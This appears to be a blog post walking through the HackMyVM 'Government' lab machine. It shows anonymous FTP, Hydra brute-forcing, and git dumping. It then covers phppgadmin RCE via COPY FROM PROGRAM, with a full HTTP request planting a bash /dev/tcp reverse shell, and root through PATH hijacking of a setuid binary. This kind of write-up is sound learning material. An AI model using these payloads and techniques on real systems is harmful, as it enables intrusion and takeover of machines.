---
layout: post
title:  "HackMyVM: Government"
date:   2021-12-06 20:00:00 +1000
category: hacking
---

I've been doing a couple of VMs from [HackMyVM](https://hackmyvm.eu/) lately, and this was one of them. 

This is [Government](https://hackmyvm.eu/machines/machine.php?vm=Government). It's Medium rated. 

## Ports
Lots, lemme just dump my rustscan real quick:

{% highlight shell %}
[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.12:21
Open 10.10.10.12:22
Open 10.10.10.12:80
Open 10.10.10.12:111
Open 10.10.10.12:445
Open 10.10.10.12:139
Open 10.10.10.12:2049
Open 10.10.10.12:35711
Open 10.10.10.12:52347
Open 10.10.10.12:52895
Open 10.10.10.12:53581
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
{% endhighlight %}

Most of these are red herrings. Let's run through them:

### NFS
{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# showmount -e 10.10.10.12       
Export list for 10.10.10.12:
{% endhighlight %}

Yes, it was an empty list. Moving on....

### FTP
{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# ftp 10.10.10.12                                                                                                    
Connected to 10.10.10.12.
220 (vsFTPd 3.0.3)
Name (10.10.10.12:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lash
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 0        117          4096 Sep 01 15:59 .
drwxr-xr-x    5 0        117          4096 Sep 01 15:59 ..
drwxr-xr-x    2 0        0            4096 Sep 01 15:59 files
drwxr-xr-x    2 0        0            4096 Aug 31 12:33 government
drwxr-xr-x    2 0        0            4096 Nov 14 16:20 news
{% endhighlight %}

There was a bunch of files here. Like 8 or something. All text files. There were a few hashes, plus some usernames that ultimately weren't useful. This did prove to be relevant later:

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# cat encrypt.txt 
//Attention: 
-- Password are encrypted in MD5 -- 
Change the encryption with (Blowfish or Tryple DES)
//After this operation , delete this file.
- Government Policy & Rules
{% endhighlight %}

### SMB
{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# smbclient -L //10.10.10.12     
Enter WORKGROUP\root's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
{% endhighlight %}

Ok, how about:

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# smbmap -u '' -p '' -H 10.10.10.12
[+] Guest session       IP: 10.10.10.12:445     Name: unknown  
{% endhighlight %}

Ok, how about:

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# smbclient.py 10.10.10.12                                                               
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# shares
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# exit
{% endhighlight %}

Alright, I get the point.

### Bruteforce
I've got some *potential* usernames and passwords from FTP, how about trying to bruteforce SSH, FTP or SMB?

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# hydra -L ./users -P ./pass ssh://10.10.10.12 -I
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-06 04:01:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking ssh://10.10.10.12:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-06 04:01:15
                                                                                                                                                                             
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# hydra -L ./users -P ./pass smb://10.10.10.12 -I
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-06 04:01:20
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 20 login tries (l:5/p:4), ~20 tries per task
[DATA] attacking smb://10.10.10.12:445/
[445][smb] Host: 10.10.10.12 Account: emma  Error: Invalid account (Anonymous success)
[445][smb] Host: 10.10.10.12 Account: christian Error: Invalid account (Anonymous success)
[445][smb] Host: 10.10.10.12 Account: luds Error: Invalid account (Anonymous success)
[445][smb] Host: 10.10.10.12 Account: malic Error: Invalid account (Anonymous success)
[445][smb] Host: 10.10.10.12 Account: susan Error: Invalid account (Anonymous success)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-06 04:01:21
                                                                                                                                                                             
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# hydra -L ./users -P ./pass ftp://10.10.10.12 -I
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-06 04:01:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:5/p:4), ~2 tries per task
[DATA] attacking ftp://10.10.10.12:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-06 04:01:33
{% endhighlight %}                             

No, no and no.

### Webserver
A few interesting results from **dirsearch**:

{% highlight shell %}
[04:20:32] 200 -   27KB - /blog/                                                           [04:20:32] 301 -  309B  - /blog  ->  http://10.10.10.12/blog/    
[04:20:36] 200 -   43B  - /index.html                                                     [04:20:36] 301 -  315B  - /javascript  ->  http://10.10.10.12/javascript/                 [04:20:39] 301 -  315B  - /phppgadmin  ->  http://10.10.10.12/phppgadmin/                 [04:20:39] 200 -    1KB - /phppgadmin/                         
[04:20:39] 200 -   52B  - /robots.txt    
{% endhighlight %}  

robots.txt?

>User-agent: *  
Disallow: /login.php  
Disallow: /admin  

These files don't exist.

I try *blog* and click around; can't find a login page. It's cloned from [here](https://github.com/hacktheme/Nice-Admin/). Can't find anything useful. 

Feroxbuster?

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# feroxbuster -u http://10.10.10.12 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200 -C 403,301

─────────────────────── ───┬──────────────────────
 🎯  Target Url            │ http://10.10.10.12
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [403, 301]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       17l       71w     1145c http://10.10.10.12/blog/.git/logs/
200       11l       29w      268c http://10.10.10.12/blog/.git/config
200        1l        2w       23c http://10.10.10.12/blog/.git/HEAD
{% endhighlight %} 

Oh, a git repo. How about gitdumper?

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# mkdir gitdump 
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# python3 /opt/gitdumper/git_dumper.py http://10.10.10.12/blog ./gitdump 
[-] Testing http://10.10.10.12/blog/.git/HEAD [200]
[-] Testing http://10.10.10.12/blog/.git/ [200]
[-] Fetching .git recursively
# etc
{% endhighlight %} 

But nothing useful in there either, yikes.

### phppgadmin
Visting /phppgadmin we get a login, and we can login as postgres:admin so that was easy. I get some more hashes from the tables in the database and run *those* through JtR and re-run my Hydra attacks from earlier - nothing. 

But, we have an [exploit](https://www.exploit-db.com/exploits/49736) that might work? I try it - success. We have RCE. I get a shell by writing a bash reverse shell to a file and then calling it:

{% highlight shell %}
POST /phppgadmin/sql.php HTTP/1.1
Host: 10.10.10.12
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 223
Origin: http://10.10.10.12
Connection: close
Referer: http://10.10.10.12/phppgadmin/sqledit.php?subject=table&server=localhost%3A5432%3Aallow&database=postgres&action=sql
Cookie: PPA_ID=cp6bdlko3q7p25n3nj72qfhb42; webfx-tree-cookie-persistence=wfxt-26+wfxt-14+wfxt-12+wfxt-10+wfxt-8+wfxt-6+wfxt-4+wfxt-28
Upgrade-Insecure-Requests: 1

server=localhost%3A5432%3Aallow&database=postgres&search_path=public&query=COPY+cmd_exec+FROM+PROGRAM+%27printf+%22%2Fbin%2Fbash+-c+bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.2%2F1234+0%3E%261%5Cn%22+%3E+%2Ftmp%2Fshell.sh%27%3B
{% endhighlight %} 

Lemme URL decode that here:

``
COPY+cmd_exec+FROM+PROGRAM+'printf+"/bin/bash+-c+bash+-i+>&+/dev/tcp/10.10.10.2/1234+0>&1\n"+>+/tmp/shell.sh';
``

The follow-up was:

``
COPY+cmd_exec+FROM+PROGRAM+'chmod++x+/tmp/shell.sh+&&+/bin/bash+/tmp/shell.sh';
``

And I have a shell:

{% highlight shell %}
┌──(root💀kali)-[/opt/hackmyvm/government]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.10.2] from (UNKNOWN) [10.10.10.12] 33634
which python 
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash");'
postgres@government:/var/lib/postgresql/9.6/main$
{% endhighlight %} 

### User
There is one user, **erik**. We can't read his files. Linpeas gives me squat. This one came down to manual enumeration, which eventually lead to this:

{% highlight shell %}
postgres@government:/var/log$ cat .creds.log
cat .creds.log
##WARNING##

//This file contain sensitive informations!!


/////////////////////////////////////////////////////////////
244fff13bf3c5f471e0e6bf7900945936cf1354dfea15130
////////////////////////////////////////////////////////////
key: Tr770f1NdMy1mP0sSibl3P4sSw0rD,7iK3Th4t!
////////////////////////////////////////////////////////////
IV: 5721370743022037
////////////////////////////////////////////////////////////


#WARNING#
postgres@government:/var/log$
{% endhighlight %} 

This is **blowfish** encrypted per the hint from the FTP file, and we can decrypt it using CyberChef (and no doubt many other ways) to get erik's password: h4cK1sMyf4v0ri73G4m3

### Privesc
Enumerating *erik's* home directory reveals something of interest:

{% highlight shell %}
erik@government:~/backups$ ls -lash
ls -lash
total 24K
4.0K drwxr-xr-x  6 erik erik 4.0K Aug 31 19:31 .
4.0K drwxr-x---+ 4 erik erik 4.0K Nov 11 21:43 ..
4.0K drwxr-xr-x  2 root root 4.0K Sep  1 16:58 company
4.0K drwxr-xr-x  2 root root 4.0K Aug 31 19:30 iron
4.0K drwxr-xr-x  2 erik erik 4.0K Nov 11 21:43 nuclear
4.0K drwxr-xr-x  2 root root 4.0K Aug 31 19:27 nylon
erik@government:~/backups$ cd nuclear
cd nuclear
erik@government:~/backups/nuclear$ ls -lash
ls -lash
total 32K
4.0K drwxr-xr-x 2 erik erik 4.0K Nov 11 21:43 .
4.0K drwxr-xr-x 6 erik erik 4.0K Aug 31 19:31 ..
4.0K -rw-r--r-- 1 root root   75 Aug 31 19:22 file.txt
4.0K -rw-r--r-- 1 root root   82 Aug 31 19:23 git.txt
4.0K -rw-r--r-- 1 root root   73 Aug 31 19:25 nuc.txt
 12K -rwsr-sr-x 1 root root 8.6K Aug 31 18:28 remove
erik@government:~/backups/nuclear$ file remove
file remove
remove: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=642cb00ee8a40c67e6ab27821a127fac613d2ebe, not stripped
{% endhighlight %} 

If we run strings on the binary, it's calling *time*

``
time ./
``

And if we call the binary on a non-existant file we get this:

{% highlight shell %}
erik@government:~/backups/nuclear$ ./remove a
./remove a
sh: 1: time: not found
{% endhighlight %}

Well then our path is clear:

{% highlight shell %}
erik@government:~/backups/nuclear$ export PATH=/home/erik/backups/nuclear:$PATH
erik@government:~/backups/nuclear$ printf 'sh\n' > time
printf 'sh\n' > time
erik@government:~/backups/nuclear$ chmod +x time
chmod +x time
erik@government:~/backups/nuclear$ ./remove a
./remove a
# id
id
uid=1000(erik) gid=1000(erik) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),1000(erik)
# cd /root
cd /root
# ls -lash
ls -lash
total 32K
4.0K drwx------  4 root root 4.0K Sep  1 19:12 .
4.0K drwxr-xr-x 22 root root 4.0K Aug 30 19:51 ..
   0 lrwxrwxrwx  1 root root    9 Sep  1 19:12 .bash_history -> /dev/null
4.0K -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
4.0K drwxr-xr-x  2 root root 4.0K Aug 30 21:03 .nano
4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4.0K -rw-r--r--  1 root root   33 Aug 31 16:25 root.txt
4.0K drwxr-xr-x  2 root root 4.0K Aug 31 12:48 .rpmdb
4.0K -rw-r--r--  1 root root  169 Aug 30 23:10 .wget-hsts
# cat root.txt
cat root.txt
FLAG_GOES_HERE
{% endhighlight %}

So, this was pretty good. I've also done Stars, Serve and Hundred, maybe I'll write those up but not right now.
